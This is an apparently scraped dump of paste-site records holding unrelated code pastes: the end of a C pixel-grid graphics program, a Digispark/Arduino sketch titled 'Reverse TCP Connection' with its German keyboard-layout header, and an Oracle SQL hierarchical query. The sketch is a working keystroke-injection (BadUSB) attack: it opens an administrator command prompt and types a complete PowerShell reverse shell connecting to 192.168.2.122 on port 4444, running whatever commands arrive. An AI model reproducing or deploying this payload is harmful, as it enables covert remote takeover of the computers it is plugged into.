current pixel color on the old grid\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pixelColor = grid[x][y];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (pixelColor == 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 continue;\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (oi = x - 1; oi <= x + 1; oi++)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // wrap i\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 i = (oi + height) % height;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (oj = y - 1; oj <= y + 1; oj++)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // wrap j\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 j = (oj + width) % width;\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 targetColor = grid[i][j];\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // // if next cell is full ignore + randomness\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (targetColor != 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 continue;\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // mutate the new color\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 newR = randInt(0, 255);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 newG = randInt(0, 255);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 newB = randInt(0, 255);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0\n\xa0 \xa0 // /* End graphics drawing */\n\xa0 \xa0 gfx_End();\n\xa0\n\xa0 \xa0 return 0;\n}', date='2022-06-01 13:16:03 +00:00', hash_val='36b774247537106529f46b882c13b56a', url='/EbtiverJ', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Farliam', title='Reverse TCP Connection', content='#include ""GermanLayout.h""\n\xa0\n#define KEY_TAB 0x2b\n\xa0\nvoid setup() {\n\xa0 \xa0 DigiKeyboard.delay(500);\n\xa0 \xa0 pinMode(1, OUTPUT);\n}\n\xa0\nvoid StartAdminCMD(){\n\xa0 DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT);\n\xa0 DigiKeyboard.delay(500);\n\xa0 DigiKeyboardDe.println(""powershell \xa0Start-Process cmd -Verb runAs"");\n\xa0 DigiKeyboard.delay(1500);\n\xa0 DigiKeyboardDe.sendKeyStroke(KEY_ARROW_LEFT);\n\xa0 DigiKeyboard.delay(500);\n\xa0 DigiKeyboardDe.sendKeyStroke(KEY_ENTER);\n}\n\xa0\n\xa0\nvoid loop() {\n\xa0 DigiKeyboard.update();\n\xa0 DigiKeyboardDe.sendKeyStroke(0);\n\xa0\n\xa0 StartAdminCMD();\n\xa0 \n\xa0 DigiKeyboard.delay(1000);\n\xa0 DigiKeyboardDe.println(F(""powershell -command \\""$client = New-Object System.Net.Sockets.TCPClient(\'192.168.2.122\',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd) + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\\"""")); \n\xa0 DigiKeyboard.delay(5000);\n\xa0 digitalWrite(1, HIGH); \n\xa0 DigiKeyboard.delay(90000);\n\xa0 digitalWrite(1, LOW);\n\xa0 DigiKeyboard.delay(5000);\n}\n\xa0\n//Remove .Path from (path)+\n//-windowstyle Maximized', date='2022-06-01 13:09:44 +00:00', hash_val='83c20c8c1f7a970af22ecea417e27d75', url='/a22PZrCN', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Farliam', title='GermanLayout.h', content='#include ""DigiKeyboard.h""\n#ifndef DIGIKEYBOARDDE_H\n#define DIGIKEYBOARDDE_H\n\xa0\n\xa0\n#define DE_MOD_CONTROL_LEFT \xa0 \xa0(1<<8)\n#define DE_MOD_SHIFT_LEFT \xa0 \xa0 \xa0(1<<9)\n#define DE_MOD_ALT_LEFT \xa0 \xa0 \xa0 \xa0(1<<10)\n#define DE_MOD_GUI_LEFT \xa0 \xa0 \xa0 \xa0(1<<11)\n#define DE_MOD_CONTROL_RIGHT \xa0 (1<<12)\n#define DE_MOD_SHIFT_RIGHT \xa0 \xa0 (1<<13)\n#define DE_MOD_ALT_RIGHT \xa0 \xa0 \xa0 (1<<14)\n#define DE_MOD_GUI_RIGHT \xa0 \xa0 \xa0 (1<<15)\nconst uint16_t _ascii_de_map[128] PROGMEM =\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // NUL\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // SOH\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // STX\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // ETX\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // EOT\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // ENQ\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // ACK\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // BEL\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x2a, \xa0 \xa0 // BS Backspace\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x2b, \xa0 \xa0 // TAB \xa0Tab\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x28, \xa0 \xa0 // LF Enter\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // VT\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // FF\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // CR\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // SO\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // SI\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // DEL\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // DC1\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // DC2\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // DC3\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // DC4\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // NAK\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // SYN\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // ETB\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // CAN\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // EM\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // SUB\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // ESC\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // FS\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // GS\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // RS\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // US\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x2c, \xa0 \xa0 \xa0// \xa0\' \'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1e|DE_MOD_SHIFT_LEFT, \xa0 \xa0// !\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1F|DE_MOD_SHIFT_LEFT, \xa0 \xa0// ""\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x38, \xa0 \xa0// #\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x21|DE_MOD_SHIFT_LEFT, \xa0 \xa0// $\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x22|DE_MOD_SHIFT_LEFT, \xa0 \xa0// %\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x23|DE_MOD_SHIFT_LEFT, \xa0 \xa0// &\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x32|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0 \xa0 \xa0// \'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x25|DE_MOD_SHIFT_LEFT, \xa0 \xa0// (\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x26|DE_MOD_SHIFT_LEFT, \xa0 \xa0// )\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x30|DE_MOD_SHIFT_LEFT, \xa0 \xa0// *\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x30, \xa0 \xa0// +\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x36, \xa0 \xa0 \xa0 \xa0 \xa0// ,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x38, \xa0 \xa0 \xa0 \xa0 \xa0// -\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x37, \xa0 \xa0 \xa0 \xa0 \xa0// .\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x24|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0 \xa0 \xa0// /\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x27, \xa0 \xa0 \xa0 \xa0 \xa0// 0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1e, \xa0 \xa0 \xa0 \xa0 \xa0// 1\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1f, \xa0 \xa0 \xa0 \xa0 \xa0// 2\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x20, \xa0 \xa0 \xa0 \xa0 \xa0// 3\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x21, \xa0 \xa0 \xa0 \xa0 \xa0// 4\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x22, \xa0 \xa0 \xa0 \xa0 \xa0// 5\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x23, \xa0 \xa0 \xa0 \xa0 \xa0// 6\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x24, \xa0 \xa0 \xa0 \xa0 \xa0// 7\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x25, \xa0 \xa0 \xa0 \xa0 \xa0// 8\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x26, \xa0 \xa0 \xa0 \xa0 \xa0// 9\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x37|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// :\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x36|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0 \xa0 \xa0// ;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x64, \xa0 \xa0 \xa0// <\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x27|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0 \xa0 \xa0// =\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x64|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// >\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x2D|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// ?\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x14|DE_MOD_ALT_RIGHT, \xa0 \xa0 \xa0// @ 0x40 0x14\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x04|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// A\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x05|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// B\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x06|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// C\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x07|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// D\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x08|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// E\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x09|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// F\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0a|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// G\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0b|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// H\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0c|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// I\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0d|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// J\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0e|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// K\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0f|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// L\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x10|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// M\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x11|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// N\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x12|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// O\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x13|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// P\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x14|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// Q\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x15|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// R\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x16|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// S\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x17|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// T\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x18|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// U\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x19|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// V\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1a|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// W\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1b|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// X\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1d|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// Y\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1c|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// Z\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x25|DE_MOD_ALT_RIGHT, \xa0 \xa0 \xa0 \xa0 \xa0// [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x2d|DE_MOD_ALT_RIGHT, \xa0 \xa0 \xa0 \xa0 \xa0// bslash\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x26|DE_MOD_ALT_RIGHT, \xa0 \xa0 \xa0 \xa0 \xa0// ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x35, \xa0 \xa0// ^\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x38|DE_MOD_SHIFT_LEFT, \xa0 \xa0// _\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x2E|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0 \xa0 \xa0// `\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x04, \xa0 \xa0 \xa0 \xa0 \xa0// a\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x05, \xa0 \xa0 \xa0 \xa0 \xa0// b\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x06, \xa0 \xa0 \xa0 \xa0 \xa0// c\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x07, \xa0 \xa0 \xa0 \xa0 \xa0// d\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x08, \xa0 \xa0 \xa0 \xa0 \xa0// e\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x09, \xa0 \xa0 \xa0 \xa0 \xa0// f\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0a, \xa0 \xa0 \xa0 \xa0 \xa0// g\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0b, \xa0 \xa0 \xa0 \xa0 \xa0// h\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0c, \xa0 \xa0 \xa0 \xa0 \xa0// i\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0d, \xa0 \xa0 \xa0 \xa0 \xa0// j\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0e, \xa0 \xa0 \xa0 \xa0 \xa0// k\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0f, \xa0 \xa0 \xa0 \xa0 \xa0// l\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x10, \xa0 \xa0 \xa0 \xa0 \xa0// m\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x11, \xa0 \xa0 \xa0 \xa0 \xa0// n\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x12, \xa0 \xa0 \xa0 \xa0 \xa0// o\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x13, \xa0 \xa0 \xa0 \xa0 \xa0// p\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x14, \xa0 \xa0 \xa0 \xa0 \xa0// q\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x15, \xa0 \xa0 \xa0 \xa0 \xa0// r\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x16, \xa0 \xa0 \xa0 \xa0 \xa0// s\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x17, \xa0 \xa0 \xa0 \xa0 \xa0// t\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x18, \xa0 \xa0 \xa0 \xa0 \xa0// u\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x19, \xa0 \xa0 \xa0 \xa0 \xa0// v\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1a, \xa0 \xa0 \xa0 \xa0 \xa0// w\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1b, \xa0 \xa0 \xa0 \xa0 \xa0// x\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1d, \xa0 \xa0 \xa0 \xa0 \xa0// y\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1c, \xa0 \xa0 \xa0 \xa0 \xa0// z\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x24|DE_MOD_ALT_RIGHT, \xa0 \xa0// {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x64|DE_MOD_ALT_RIGHT, \xa0 \xa0// |\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x27|DE_MOD_ALT_RIGHT, \xa0 \xa0// }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x30|DE_MOD_ALT_RIGHT, \xa0 \xa0// ~\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0 \xa0 \xa0 \xa0 // DEL\n\xa0 \xa0 \xa0 \xa0 };\n\xa0\nclass DigiKeyboardDeviceDe : public DigiKeyboardDevice{\n\xa0 \xa0 public:\n\xa0 \xa0 size_t write(uint8_t chr) {\n\xa0 \xa0 \xa0 \xa0 unsigned int temp = pgm_read_word_near(_ascii_de_map + chr);\n\xa0 \xa0 \xa0 \xa0 unsigned char low = temp & 0xFF;\n\xa0 \xa0 \xa0 \xa0 unsigned char high = (temp >> 8) & 0xFF;\n\xa0 \xa0 \xa0 \xa0 sendKeyStroke(low,high);\n\xa0 \xa0 \xa0 \xa0 return 1;\n\xa0 \xa0 }\n\xa0 \xa0 void sendKeyReport(uchar *array,const unsigned int size){\n\xa0 \xa0 \xa0 \xa0 while (!usbInterruptIsReady()) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Note: We wait until we can send keyPress\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // \xa0 \xa0 \xa0 so we know the previous keyPress was\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // \xa0 \xa0 \xa0 sent.\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 usbPoll();\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 _delay_ms(5);\n\xa0 \xa0 \xa0 \xa0 }\n\xa0\n\xa0 \xa0 \xa0 \xa0 usbSetInterrupt(array, size);\n\xa0 \xa0 }\n};\nDigiKeyboardDeviceDe DigiKeyboardDe = DigiKeyboardDeviceDe();\n#endif //DIGIKEYBOARDDE_H', date='2022-06-01 13:07:38 +00:00', hash_val='be263aa347259a4cf33f40779d0d1d31', url='/xQHPkXSh', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Maks140888', title='Untitled', content="CREATE TYPE objects_below IS TABLE OF VARCHAR2(200);\n\xa0\ncreate or replace function find_objects_below(obj_x VARCHAR2)\nreturn objects_below as object_name \xa0objects_below;\nbegin \n\xa0 \xa0 select name \n\xa0 \xa0 bulk collect into object_name\n\xa0 \xa0 FROM objects \n\xa0 \xa0 START WITH objects.name = obj_x\n\xa0 \xa0 CONNECT by prior object_id = parent_id;\n\xa0\n\xa0 \xa0 return object_name;\nend;\n\xa0\nselect * from \xa0table(find_objects_below('розклад'));", date='2022-06-01 13:05:12 +00:00', hash_val='fa44e91eb93210b2eca56ef9b3f12e6e', url='/KkH3NTqf', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': 